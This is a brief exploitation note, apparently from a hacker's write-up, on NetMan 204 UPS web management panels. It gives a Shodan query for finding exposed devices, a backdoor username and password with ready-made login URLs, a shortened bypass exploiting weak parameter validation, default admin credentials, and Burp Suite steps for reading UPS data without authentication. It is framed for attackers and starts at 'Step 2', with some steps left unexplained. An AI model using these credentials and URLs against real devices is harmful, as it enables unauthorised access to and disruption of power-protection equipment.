Shodan :   http.favicon.hash:22913038  OR  https://www.shodan.io/search?query=netman+204+cgi-bin

# We Found Two panel  Yellow and blue 

Step 2 : For Yellow panel attacker can use these username and password because there have backdoor and for Blue panel we can use the Remote commands  and burpsuite repeater to see the details of the ups .

Yellow Panel : username and password : eurek

Some exploits for that :

http://[IP]/cgi-bin/login.cgi?username=eurek&password=eurek
or
https://[IP]/cgi-bin/login.cgi?username=eurek&password=eurek

Due to flaws in parameter validation, the URL can be shortened to:

http://[IP]/cgi-bin/login.cgi?username=eurek%20eurek
or
https://[IP]/cgi-bin/login.cgi?username=eurek%20eurek


Blue Panel : username and password : admin

#With using up paths we can see the details of the UPS without authentication .

First open burpsuite and intercept the requests then use the up paths and after that send that request to the repeater then send it again and in your response open the render and enjoy :)
